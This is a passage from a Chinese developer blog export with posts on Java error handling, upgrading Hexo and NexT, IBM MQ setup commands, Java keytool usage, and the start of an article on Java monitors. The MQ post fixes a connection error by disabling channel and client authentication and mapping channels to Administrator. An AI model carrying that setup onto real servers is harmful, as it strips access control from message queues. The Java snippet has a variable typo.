_response.sendError(sc,msg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sendError</span><span class="params">(<span class="keyword">int</span> sc)</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">        String path = _request.getServletPath() + _request.getPathInfo();</span><br><span class="line">        <span class="keyword">if</span>(sc == <span class="number">403</span> &amp;&amp; path != <span class="keyword">null</span>)&#123;</span><br><span class="line">            _response.sendError(<span class="number">404</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            _response.sendError(sc,ms);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>安全</tag>
        <tag>AppScan</tag>
        <tag>403改为404</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo升级和切换主题到Next</title>
    <url>/2018/06/24/hexo-upgrade-and-change-next-theme/</url>
    <content><![CDATA[<p>好久没管过hexo，今天升级hexo，切换为next主题 后，遇坑无数，记录一下。</p><a id="more"></a><p>之前一直使用的<code>hexo 2.8.3</code>，后来有台机器升级了node，这台机器上再使用hexo就有点问题。索性就都升级了。当前使用<code>hexo 3.7.1</code></p><p>遇坑如下：</p><h3 id="当hexo-g-报错-Error-expected-end-of-comment-got-end-of-file"><a href="#当hexo-g-报错-Error-expected-end-of-comment-got-end-of-file" class="headerlink" title="当hexo g 报错 Error: expected end of comment, got end of file"></a>当hexo g 报错 Error: expected end of comment, got end of file</h3><p>找找md 文件中应该是含有 {&#35; ，需要使用raw包含起来为<code>{&#35;</code>，或是使用三个<code>`</code> 符号包含起来</p><figure class="highlight clean"><table><tr><td class="code"><pre><span class="line">grep &#123;# *.md -rn</span><br><span class="line"># 即 &#123;#需要改为 &#123;% raw %&#125;&#123;#&#123;% endraw %&#125; &#123;&#123; <span class="string">'&#123;#'</span> &#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="当hexo-g-报错-mozjpeg-vendor-cjpeg-ENOENT-等"><a href="#当hexo-g-报错-mozjpeg-vendor-cjpeg-ENOENT-等" class="headerlink" title="当hexo g 报错 mozjpeg/vendor/cjpeg ENOENT 等"></a>当hexo g 报错 mozjpeg/vendor/cjpeg ENOENT 等</h3><p>缺少包安装啥</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install autoconf libtool nasm wget automake gcc</span><br><span class="line"><span class="meta">#</span><span class="bash">或</span></span><br><span class="line">yum install wget autoconf automake gcc nasm libtool</span><br></pre></td></tr></table></figure><p>然后，执行rebuild</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm rebuild mozjpeg  </span><br><span class="line">npm rebuild gifsicle  </span><br><span class="line">npm rebuild optipng-bin</span><br><span class="line">npm rebuild jpegtran-bin</span><br></pre></td></tr></table></figure><p>当然也是可以使用 cnpm</p><p><a href="https://hexo.io/zh-cn/docs/troubleshooting.html">hexo问题解答</a></p><h3 id="使用Gitment-替代多说"><a href="#使用Gitment-替代多说" class="headerlink" title="使用Gitment 替代多说"></a>使用Gitment 替代多说</h3><p>使用 GitHub Issues 搭建评论系统<span class="inline-yellow"><a href="https://imsun.net/posts/gitment-introduction/">Gitment</a></span></p><p>在next中只需要注册，并填写参数就行了<br>注册一个<a href="https://github.com/settings/applications/new">OAuth</a></p><p>将client_id 和 client_secret记下，新开一个专门存储评论的仓库，填入github_repo，填入对应自己github_user</p><h3 id="使用next有点小问题"><a href="#使用next有点小问题" class="headerlink" title="使用next有点小问题"></a>使用next有点小问题</h3><p>下载时没注意，直接git clone了next，也就是最新版。有点小问题，侧边栏失效。<br>比较v5.1.2 ，修改了<code>next/layout/_partials/header.swig</code> 为如下</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;% for name, path in theme.menu %&#125;</span><br><span class="line">        &#123;% set itemName = name.toLowerCase() %&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"menu-item menu-item-&#123;&#123; itemName | replace(' ', '-') &#125;&#125;"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;&#123; url_for(name.split('||')[0]) | trim &#125;&#125;"</span> <span class="attr">rel</span>=<span class="string">"section"</span>&gt;</span></span><br><span class="line">            &#123;% if theme.menu_icons.enable %&#125;</span><br><span class="line">              <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"menu-item-icon fa fa-fw fa-&#123;&#123; path.split('||')[1] | trim | default('question-circle') &#125;&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">            &#123;% endif %&#125;</span><br><span class="line">            &#123;&#123; __('menu.' + name) | replace('menu.', '') &#125;&#125;</span><br><span class="line">          <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">	</span><br><span class="line">      &#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>(实际上只是将原有<code>url_for(path.split(&#39;||&#39;)[0])</code> 改为了<code>url_for(name.split(&#39;||&#39;)[0])</code>)</p><h3 id="推翻上述说法，使用theme-next-hexo-theme-next中的新版"><a href="#推翻上述说法，使用theme-next-hexo-theme-next中的新版" class="headerlink" title="推翻上述说法，使用theme-next/hexo-theme-next中的新版"></a>推翻上述说法，使用theme-next/hexo-theme-next中的新版</h3><p>记录到一半发现next 最新版迁移了。先切换到最新版再看看</p><p>next 5.x 到 6.x 变化蛮大</p><p>从<span class="inline-yellow"><a href="https://github.com/iissnan/hexo-theme-next">iissnan/hexo-theme-next</a></span> 到了<span class="inline-yellow"><a href="https://github.com/theme-next/hexo-theme-next">theme-next/hexo-theme-next</a></span></p><h2 id="记录以下升级步骤"><a href="#记录以下升级步骤" class="headerlink" title="记录以下升级步骤"></a>记录以下升级步骤</h2><p>关于升级第一点，没事别手贱升级！！！</p><h3 id="nvm-升级-nodejs"><a href="#nvm-升级-nodejs" class="headerlink" title="nvm 升级 nodejs"></a>nvm 升级 nodejs</h3><figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># git and source nvm</span></span><br><span class="line">git <span class="keyword">clone</span> <span class="title">https</span>://github.com/creationix/nvm ~/.nvm</span><br><span class="line">source ~/.nvm/nvm.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># install latest nodejs version, and</span></span><br><span class="line"><span class="comment"># set default node version to be used in new shell</span></span><br><span class="line">nvm install <span class="keyword">node</span><span class="title"></span></span><br><span class="line"><span class="title">nvm</span> use <span class="keyword">node</span><span class="title"></span></span><br><span class="line"><span class="title">nvm</span> alias default <span class="keyword">node</span><span class="title"></span></span><br><span class="line"><span class="title"></span></span><br><span class="line"><span class="title"># automatically</span> source nvm on login</span><br><span class="line">echo '[ -e ~/.nvm/nvm.sh ] &amp;&amp; source ~/.nvm/nvm.sh' &gt;&gt; ~/.bashrc</span><br></pre></td></tr></table></figure><h3 id="如没安装cnpm"><a href="#如没安装cnpm" class="headerlink" title="如没安装cnpm"></a>如没安装cnpm</h3><p>用的淘宝家的镜像</p><figure class="highlight coffeescript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">npm</span> install cnpm -g --registry=https://registry.<span class="built_in">npm</span>.taobao.org</span><br></pre></td></tr></table></figure><h3 id="升级hexo"><a href="#升级hexo" class="headerlink" title="升级hexo"></a>升级hexo</h3><p>简单粗暴全局升级hexo-cli</p><figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line">cnpm i hexo-<span class="keyword">cli</span> -g</span><br></pre></td></tr></table></figure><h3 id="cnpm-outdated检查hexo-需要更新的组件"><a href="#cnpm-outdated检查hexo-需要更新的组件" class="headerlink" title="cnpm outdated检查hexo 需要更新的组件"></a>cnpm outdated检查hexo 需要更新的组件</h3><p>使用 <code>cnpm outdated</code> 查看哪些组件需要更新版本</p><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">cnpm outdated</span><br><span class="line">Package                          Current  Wanted  Latest  Location</span><br><span class="line">babel-runtime                     linked  <span class="number">6.26</span><span class="number">.0</span>  <span class="number">6.26</span><span class="number">.0</span>  hexo-site</span><br><span class="line">eslint-config-theme-next          linked   <span class="number">1.1</span><span class="number">.3</span>   <span class="number">1.1</span><span class="number">.3</span>  hexo-site</span><br><span class="line">hexo                              linked   <span class="number">4.0</span><span class="number">.0</span>   <span class="number">4.0</span><span class="number">.0</span>  hexo-site</span><br><span class="line">hexo-addlink                      linked   <span class="number">1.0</span><span class="number">.4</span>   <span class="number">1.0</span><span class="number">.4</span>  hexo-site</span><br><span class="line">hexo-all-minifier                 linked   <span class="number">0.5</span><span class="number">.3</span>   <span class="number">0.5</span><span class="number">.3</span>  hexo-site</span><br><span class="line">hexo-<span class="built_in">auto</span>nofollow                 linked   <span class="number">1.0</span><span class="number">.1</span>   <span class="number">1.0</span><span class="number">.1</span>  hexo-site</span><br><span class="line">hexo-deployer-git                 linked   <span class="number">2.1</span><span class="number">.0</span>   <span class="number">2.1</span><span class="number">.0</span>  hexo-site</span><br><span class="line">hexo-filter-optimize              linked   <span class="number">0.2</span><span class="number">.7</span>   <span class="number">0.2</span><span class="number">.7</span>  hexo-site</span><br><span class="line">hexo-generator-baidu-sitemap      linked   <span class="number">0.1</span><span class="number">.6</span>   <span class="number">0.1</span><span class="number">.6</span>  hexo-site</span><br><span class="line">hexo-generator-feed               linked   <span class="number">2.2</span><span class="number">.0</span>   <span class="number">2.2</span><span class="number">.0</span>  hexo-site</span><br><span class="line">hexo-generator-search             linked   <span class="number">2.4</span><span class="number">.0</span>   <span class="number">2.4</span><span class="number">.0</span>  hexo-site</span><br><span class="line">hexo-generator-searchdb           linked   <span class="number">1.2</span><span class="number">.0</span>   <span class="number">1.2</span><span class="number">.0</span>  hexo-site</span><br><span class="line">hexo-generator-sitemap            linked   <span class="number">2.0</span><span class="number">.0</span>   <span class="number">2.0</span><span class="number">.0</span>  hexo-site</span><br><span class="line">hexo-leancloud-counter-security   linked   <span class="number">1.4</span><span class="number">.1</span>   <span class="number">1.4</span><span class="number">.1</span>  hexo-site</span><br><span class="line">hexo-next-title                   linked     git     git  hexo-site</span><br><span class="line">hexo-pdf                          linked   <span class="number">1.1</span><span class="number">.1</span>   <span class="number">1.1</span><span class="number">.1</span>  hexo-site</span><br><span class="line">hexo-symbols-count-time           linked   <span class="number">0.7</span><span class="number">.0</span>   <span class="number">0.7</span><span class="number">.0</span>  hexo-site</span><br><span class="line">hexo-tag-cloud                    linked   <span class="number">2.1</span><span class="number">.1</span>   <span class="number">2.1</span><span class="number">.1</span>  hexo-site</span><br></pre></td></tr></table></figure><p>手工修改 <code>package.json</code> 文件中的版本号</p><h3 id="cnpm-install-–save-更新组件"><a href="#cnpm-install-–save-更新组件" class="headerlink" title="cnpm install –save 更新组件"></a>cnpm install –save 更新组件</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">cnpm <span class="keyword">install</span> <span class="comment">--save</span></span><br></pre></td></tr></table></figure><h3 id="拷贝-next-自定义的swig等"><a href="#拷贝-next-自定义的swig等" class="headerlink" title="拷贝 next 自定义的swig等"></a>拷贝 next 自定义的swig等</h3><p>新版 next 新增支持了不少组件，可以将之前自定义的一些移除，使用新增组件。<br>next 支持自定义的方式发生了改变，将自定义的 swig 可以拷贝到 <code>source/_data/</code> 文件夹下，修改<code>custom_file_path</code> 对应配置</p><figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">custom_file_path:</span><br><span class="line">  head: <span class="keyword">source</span><span class="regexp">/_data/</span>head.swig</span><br><span class="line">  header: <span class="keyword">source</span><span class="regexp">/_data/</span>header.swig</span><br><span class="line">  sidebar: <span class="keyword">source</span><span class="regexp">/_data/</span>sidebar.swig</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>安装IBM WebSphere MQ以及一些基本MQ命令</title>
    <url>/2016/03/15/install-IBM-WebSphere-MQ-and-some-base-MQ-command/</url>
    <content><![CDATA[<p>IBM® MQ 是强大的消息传递中间件，有助于简化并加速多个平台中多种应用和业务数据的集成。IBM MQ 通过消息传递队列发送和接收消息数据，有助于应用、系统、服务和文件间的信息实现有保证、安全、可靠的交换，从而简化业务应用的创建和维护。它可以为范围广泛的产品提供统一消息传递，能够满足企业范围的消息传递需求，为物联网和移动设备提供连通性。</p><p><a href="http://www-03.ibm.com/software/products/zh/ibm-mq">官网地址</a></p><h3 id="安装后-MQ-本地连接，2035"><a href="#安装后-MQ-本地连接，2035" class="headerlink" title="安装后 MQ 本地连接，2035"></a>安装后 MQ 本地连接，2035</h3><p>** <code>WIN + X</code> 然后 A 以管理员打开cmd 添加用户 <code>NET USER MQUSER /ADD</code> 查看用户组 <code>Win + R LUSRMGR.MSC</code></p><p>另外创建用户在MQM组后，仍然报错时，可以考虑输入以下命令</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">** 关闭通道验证</span><br><span class="line">alter qmgr CHLAUTH(DISABLED)</span><br><span class="line">ALTER AUTHINFO(SYSTEM.DEFAULT.AUTHINFO.IDPWOS) AUTHTYPE(IDPWOS) CHCKCLNT(NONE)</span><br><span class="line">REFRESH SECURITY TYPE(CONNAUTH)</span><br></pre></td></tr></table></figure><p><a href="http://www-01.ibm.com/support/docview.wss?uid=swg21680930">原文链接</a></p><h3 id="一些基本命令"><a href="#一些基本命令" class="headerlink" title="一些基本命令"></a>一些基本命令</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">** (查看MQ是否安装成功)</span><br><span class="line">crtmqm</span><br><span class="line"></span><br><span class="line">** (创建/替换WebSphere MQ 队列管理器"Test001")</span><br><span class="line">crtmqm -lc -lf 20480 -lp 20 -ls 2 Test001 </span><br><span class="line"></span><br><span class="line">** 查看MQ 队列管理器状态</span><br><span class="line">dspmq</span><br><span class="line"></span><br><span class="line">** 启动 WebSphere MQ 队列管理器“Test001”</span><br><span class="line">strmqm Test001</span><br><span class="line"></span><br><span class="line">** 查看MQ 队列管理器状态</span><br><span class="line">dspmq</span><br><span class="line"></span><br><span class="line">** 执行temp.txt中的MQ相关命令，并将结果输出到mq.log</span><br><span class="line">runmqsc Test001 &lt; D:\mq\temp.txt &gt;mq.log</span><br><span class="line"></span><br><span class="line">** 启动队列管理器 Test001 的 MQSC</span><br><span class="line">runmqsc Test001</span><br><span class="line"></span><br><span class="line">** 1 : dis qs(*) AMQ8450: 显示队列状态详细信息</span><br><span class="line">dis qs(*)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">** 创建通道 S_CHL</span><br><span class="line">def chl(S_CHL) chltype(SVRCONN) TRPTYPE(TCP)  maxmsgl(10485760) replace</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">START CHL(S_CHL) </span><br><span class="line"></span><br><span class="line">def chl(S_CHL) chltype(SVRCONN) TRPTYPE(TCP) MCAUSER('mqm')  maxmsgl(10485760) replace</span><br><span class="line"></span><br><span class="line">ALTER CHL(S_CHL) CHLTYPE(SVRCONN) MCAUSER(null) </span><br><span class="line">ALTER CHL(S_CHL) CHLTYPE(SVRCONN) MCAUSER('MUSR_MQADMIN') </span><br><span class="line">ALTER CHL(S_CHL) CHLTYPE(SVRCONN) MCAUSER('Administrator') </span><br><span class="line"></span><br><span class="line">** 查看</span><br><span class="line">dis qcluster(*)</span><br><span class="line"></span><br><span class="line">** 创建监听TESTLISTENER</span><br><span class="line">def listener(TESTLISTENER) TRPTYPE(TCP) PORT(1415) BACKLOG(0) CONTROL(QMGR) </span><br><span class="line"></span><br><span class="line">** 启动监听</span><br><span class="line">START LISTENER(TESTLISTENER) </span><br><span class="line"></span><br><span class="line">** 显示队列管理器的细节</span><br><span class="line">dis qmgr</span><br><span class="line"></span><br><span class="line">** 修改队列管理器CCSID</span><br><span class="line">alter qmgr ccsid(1415)</span><br><span class="line"></span><br><span class="line">** 关闭通道验证</span><br><span class="line">alter qmgr CHLAUTH(DISABLED)</span><br><span class="line"></span><br><span class="line">** 创建队列 TESTQL01</span><br><span class="line">def ql(TESTQL01) maxdepth(100000) maxmsgl(10485760) defprty(9) defpsist(yes) replace</span><br><span class="line"></span><br><span class="line">** 退出</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">ALTER AUTHINFO(SYSTEM.DEFAULT.AUTHINFO.IDPWOS) AUTHTYPE(IDPWOS) CHCKCLNT(NONE)</span><br><span class="line">REFRESH SECURITY TYPE(CONNAUTH)</span><br><span class="line"></span><br><span class="line">** 停止并删除</span><br><span class="line">endmqm Test001</span><br><span class="line">dltmqm Test001</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>MQ</tag>
      </tags>
  </entry>
  <entry>
    <title>常用的Java Keytool Keystore命令</title>
    <url>/2016/05/05/java-keytool-keystore/</url>
    <content><![CDATA[<p>Java keytool是密钥和证书管理工具。它使用户能够管理自己的公钥/私钥对及相关证书，用于（通过数字签名）自我认证（用户向别的用户/服务认证自己）或数据完整性以及认证服务。它还允许用户储存他们的通信对等者的公钥（以证书形式）。</p><h2 id="常用的Java-Keytool-Keystore命令"><a href="#常用的Java-Keytool-Keystore命令" class="headerlink" title="常用的Java Keytool Keystore命令"></a>常用的Java Keytool Keystore命令</h2><h3 id="Keytool创建和导入命令"><a href="#Keytool创建和导入命令" class="headerlink" title="Keytool创建和导入命令"></a>Keytool创建和导入命令</h3><h4 id="创建keystore和密钥对"><a href="#创建keystore和密钥对" class="headerlink" title="创建keystore和密钥对"></a>创建keystore和密钥对</h4><p>Generate a Java keystore and key pair</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">keytool -genkey -alias mydomain -keyalg RSA -keystore keystore.jks -keysize 2048</span><br></pre></td></tr></table></figure><h4 id="为存在的keystore生成证书请求文件CSR"><a href="#为存在的keystore生成证书请求文件CSR" class="headerlink" title="为存在的keystore生成证书请求文件CSR"></a>为存在的keystore生成证书请求文件CSR</h4><p>Generate a certificate signing request (CSR) for an existing Java keystore</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">keytool -certreq -alias mydomain -keystore keystore.jks -file mydomain.csr</span><br></pre></td></tr></table></figure><h4 id="导入根证书或中级证书到keystore"><a href="#导入根证书或中级证书到keystore" class="headerlink" title="导入根证书或中级证书到keystore"></a>导入根证书或中级证书到keystore</h4><p>Import a root or intermediate CA certificate to an existing Java keystore</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">keytool -import -trustcacerts -alias root -file mydomain.crt -keystore keystore.jks</span><br></pre></td></tr></table></figure><h4 id="导入SSL服务器证书到keystore"><a href="#导入SSL服务器证书到keystore" class="headerlink" title="导入SSL服务器证书到keystore"></a>导入SSL服务器证书到keystore</h4><p>Import a signed primary certificate to an existing Java keystore</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">keytool -import -trustcacerts -alias mydomain -file mydomain.crt -keystore keystore.jks</span><br></pre></td></tr></table></figure><h4 id="为存在的keystore生成自签名证书"><a href="#为存在的keystore生成自签名证书" class="headerlink" title="为存在的keystore生成自签名证书"></a>为存在的keystore生成自签名证书</h4><p>Generate a keystore and self-signed certificate</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">keytool -genkey -keyalg RSA -alias selfsigned -keystore keystore.jks -storepass password -validity 360 -keysize 2048</span><br></pre></td></tr></table></figure><h3 id="Keytool查看命令"><a href="#Keytool查看命令" class="headerlink" title="Keytool查看命令"></a>Keytool查看命令</h3><h4 id="查看单个证书"><a href="#查看单个证书" class="headerlink" title="查看单个证书"></a>查看单个证书</h4><p>Check a stand-alone certificate</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">keytool -printcert -v -file mydomain.crt</span><br></pre></td></tr></table></figure><h4 id="列出keystore存在的所有证书"><a href="#列出keystore存在的所有证书" class="headerlink" title="列出keystore存在的所有证书"></a>列出keystore存在的所有证书</h4><p>Check which certificates are in a Java keystore</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">keytool -list -v -keystore keystore.jks</span><br></pre></td></tr></table></figure><h4 id="使用别名查看keystore特定条目"><a href="#使用别名查看keystore特定条目" class="headerlink" title="使用别名查看keystore特定条目"></a>使用别名查看keystore特定条目</h4><p>Check a particular keystore entry using an alias</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">keytool -list -v -keystore keystore.jks -alias mydomain</span><br></pre></td></tr></table></figure><h3 id="其他Keytool命令"><a href="#其他Keytool命令" class="headerlink" title="其他Keytool命令"></a>其他Keytool命令</h3><h4 id="删除keystore里面指定证书"><a href="#删除keystore里面指定证书" class="headerlink" title="删除keystore里面指定证书"></a>删除keystore里面指定证书</h4><p>Delete a certificate from a Java Keytool keystore</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">keytool -delete -alias mydomain -keystore keystore.jks</span><br></pre></td></tr></table></figure><h4 id="更改keysore密码"><a href="#更改keysore密码" class="headerlink" title="更改keysore密码"></a>更改keysore密码</h4><p>Change a Java keystore password</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">keytool -storepasswd -new new_storepass -keystore keystore.jks</span><br></pre></td></tr></table></figure><h4 id="导出keystore里面的指定证书"><a href="#导出keystore里面的指定证书" class="headerlink" title="导出keystore里面的指定证书"></a>导出keystore里面的指定证书</h4><p>Export a certificate from a keystore</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">keytool -export -alias mydomain -file mydomain.crt -keystore keystore.jks</span><br></pre></td></tr></table></figure><h4 id="列出信任的CA证书"><a href="#列出信任的CA证书" class="headerlink" title="列出信任的CA证书"></a>列出信任的CA证书</h4><p>List Trusted CA Certs</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">keytool -list -v -keystore $JAVA_HOME/jre/lib/security/cacerts</span><br></pre></td></tr></table></figure><h4 id="导入新的CA到信任证书"><a href="#导入新的CA到信任证书" class="headerlink" title="导入新的CA到信任证书"></a>导入新的CA到信任证书</h4><p>Import New CA into Trusted Certs</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">keytool -import -trustcacerts -file /path/to/ca/ca.pem -alias CA_ALIAS -keystore $JAVA_HOME/jre/lib/security/cacertss</span><br></pre></td></tr></table></figure><h2 id="Keytool介绍"><a href="#Keytool介绍" class="headerlink" title="Keytool介绍"></a>Keytool介绍</h2><p>Keytool 是一个Java数据证书的管理工具 ,Keytool将密钥（key）和证书（certificates）存在一个称为keystore的文件中在keystore里，包含两种数据:密钥实体（Key entity）-密钥（secret key）或者是私钥和配对公钥（采用非对称加密）可信任的证书实体（trusted certificate entries）-只包含公钥.</p><p>JDK中keytool常用参数说明（不同版本有差异，详细可参见【附录】中的官方文档链接）:</p><p>-genkey 在用户主目录<br>-genkey 在用户主目录中创建一个默认文件”.keystore”,还会产生一个mykey的别名，mykey中包含用户的公钥、私钥和证书(在没有指定生成位置的情况下,keystore会存在用户系统默认目录)<br>-alias 产生别名 每个keystore都关联这一个独一无二的alias，这个alias通常不区分大小写<br>-keystore 指定密钥库的名称(产生的各类信息将不在.keystore文件中)<br>-keyalg 指定密钥的算法 (如 RSA DSA，默认值为：DSA)<br>-validity 指定创建的证书有效期多少天(默认 90)<br>-keysize 指定密钥长度 （默认 1024）<br>-storepass 指定密钥库的密码(获取keystore信息所需的密码)<br>-keypass 指定别名条目的密码(私钥的密码)<br>-dname 指定证书发行者信息 其中： “CN=名字与姓氏,OU=组织单位名称,O=组织名称,L=城市或区域名 称,ST=州或省份名称,C=单位的两字母国家代码”<br>-list 显示密钥库中的证书信息 keytool -list -v -keystore 指定keystore -storepass 密码<br>-v 显示密钥库中的证书详细信息<br>-export 将别名指定的证书导出到文件 keytool -export -alias 需要导出的别名 -keystore 指定keystore -file 指定导出的证书位置及证书名称 -storepass 密码<br>-file 参数指定导出到文件的文件名<br>-delete 删除密钥库中某条目 keytool -delete -alias 指定需删除的别 -keystore 指定keystore – storepass 密码<br>-printcert 查看导出的证书信息 keytool -printcert -file g:\sso\michael.crt<br>-keypasswd 修改密钥库中指定条目口令 keytool -keypasswd -alias 需修改的别名 -keypass 旧密码 -new 新密码 -storepass keystore密码 -keystore sage<br>-storepasswd 修改keystore口令 keytool -storepasswd -keystore g:\sso\michael.keystore(需修改口令的keystore) -storepass pwdold(原始密码) -new pwdnew(新密码)<br>-import 将已签名数字证书导入密钥库 keytool -import -alias 指定导入条目的别名 -keystore 指定keystore -file 需导入的证书<br>中创建一个默认文件”.keystore”,还会产生一个mykey的别名，mykey中包含用户的公钥、私钥和证书(在没有指定生成位置的情况下,keystore会存在用户系统默认目录)<br>-alias 产生别名 每个keystore都关联这一个独一无二的alias，这个alias通常不区分大小写<br>-keystore 指定密钥库的名称(产生的各类信息将不在.keystore文件中)<br>-keyalg 指定密钥的算法 (如 RSA DSA，默认值为：DSA)<br>-validity 指定创建的证书有效期多少天(默认 90)<br>-keysize 指定密钥长度 （默认 1024）<br>-storepass 指定密钥库的密码(获取keystore信息所需的密码)<br>-keypass 指定别名条目的密码(私钥的密码)<br>-dname 指定证书发行者信息 其中： “CN=名字与姓氏,OU=组织单位名称,O=组织名称,L=城市或区域名 称,ST=州或省份名称,C=单位的两字母国家代码”<br>-list 显示密钥库中的证书信息 keytool -list -v -keystore 指定keystore -storepass 密码<br>-v 显示密钥库中的证书详细信息<br>-export 将别名指定的证书导出到文件 keytool -export -alias 需要导出的别名 -keystore 指定keystore -file 指定导出的证书位置及证书名称 -storepass 密码<br>-file 参数指定导出到文件的文件名<br>-delete 删除密钥库中某条目 keytool -delete -alias 指定需删除的别 -keystore 指定keystore – storepass 密码<br>-printcert 查看导出的证书信息 keytool -printcert -file g:\sso\michael.crt<br>-keypasswd 修改密钥库中指定条目口令 keytool -keypasswd -alias 需修改的别名 -keypass 旧密码 -new 新密码 -storepass keystore密码 -keystore sage<br>-storepasswd 修改keystore口令 keytool -storepasswd -keystore g:\sso\michael.keystore(需修改口令的keystore) -storepass pwdold(原始密码) -new pwdnew(新密码)<br>-import 将已签名数字证书导入密钥库 keytool -import -alias 指定导入条目的别名 -keystore 指定keystore -file 需导入的证书</p><h2 id="keytool英文介绍"><a href="#keytool英文介绍" class="headerlink" title="keytool英文介绍"></a>keytool英文介绍</h2><p>Java Keytool is a key and certificate management utility. It allows users to manage their own public/private key pairs and certificates. It also allows users to cache certificates. Java Keytool stores the keys and certificates in what is called a keystore. By default the Java keystore is implemented as a file. It protects private keys with a password. A Keytool keystore contains the private key and any certificates necessary to complete a chain of trust and establish the trustworthiness of the primary certificate.</p><p>Each certificate in a Java keystore is associated with a unique alias. When creating a Java keystore you will first create the .jks file that will initially only contain the private key. You will then generate a CSR and have a certificate generated from it. Then you will import the certificate to the keystore including any root certificates. Java Keytool also several other functions that allow you to view the details of a certificate or list the certificates contained in a keystore or export a certificate.</p><p><a href="https://www.chinassl.net/ssltools/keytool-commands.html">原文链接</a></p>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>keystore</tag>
      </tags>
  </entry>
  <entry>
    <title>转:深入分析Java中基于监视器(Monitor)的同步(Synchronization)机制</title>
    <url>/2017/10/25/java-monitor-synchronization/</url>
    <content><![CDATA[<p>如果读者在大学期间学习过操作系统相关课程，并且没有在课堂上睡着的话。那么可能知道，监视器(monitor)是操作系统中用于实现同步(synchronization)机制非常重要的基础数据结构。幸运的是，Java中对于同步(synchronization)机制的实现，同样是基于监视器。本文将使用类比的方式来讲述Java中同步(synchronization)机制的基础：监视器(monitor)。</p><a id="more"></a><h2 id="监视器-Monitor-概述"><a href="#监视器-Monitor-概述" class="headerlink" title="监视器(Monitor)概述"></a>监视器(Monitor)概述</h2><p>一个监视器可以被类比成一栋房子(Building)，该房子里面包含了一个特殊的房间(Special Room)。这个特殊的房间在某一个时刻只可以被一个客户(线程)占领。通常来说，这个房间里会包含一些数据和代码。</p><p><img alt="Monitor" data-src="Monitor.jpg"></p><p>正如上图所示，在该栋房子中，一共会有三个房间。如果一个客户(线程)想要占领这个特殊的房间，它必须首先进入到 Hallway(Entry Set) 中进行等待。调度程序(Scheduler)将会基于某种策略(比如，FIFO),从Hallway中选择某一个客户。如果这个客户(线程)因为某些事件或原因被挂起了，该客户进离开 特殊房间 而进入 等待房间(Wait Room)，以后，调度程序可能会重新选择它，把它从 等待房间 放入到 特殊房间中。</p><p>简而言之，一个监视器就是用于监控与调度多个线程如何进入特殊房间的基础设备。它可以确保只有一个客户(线程)可以访问受保护的数据或代码。</p><h2 id="实现细节"><a href="#实现细节" class="headerlink" title="实现细节"></a>实现细节</h2><p>在Java虚拟机(JVM)中，每一个对象(Object)和每一个类(Class)都在逻辑上与某一个监视器(monitor)关联在一起。为了实现所有的这些监视器(monitors)之间的相互排斥能力，每一个对象(Object)和每一个类(Class)都具有一个锁(lock, 也称互斥锁(mutex))。在正统的操作系统中，这种情形又称为一个信号(semaphore)，互斥锁就是一个二元信号。</p><p><img alt="semaphore" 